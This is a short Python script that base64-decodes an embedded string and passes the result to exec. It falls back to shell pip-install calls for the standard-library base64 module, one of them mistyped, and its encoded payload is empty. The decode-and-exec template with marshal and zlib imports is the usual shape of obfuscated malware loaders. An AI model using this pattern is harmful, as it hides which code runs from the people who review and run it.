import marshal, zlib
import os, sys
try:
	import base64
except:
	os.system("pip install base64")
	os.system("pip3 install base 64")
	import base64

a = (base64.b64decode(''''''))
exec(a)
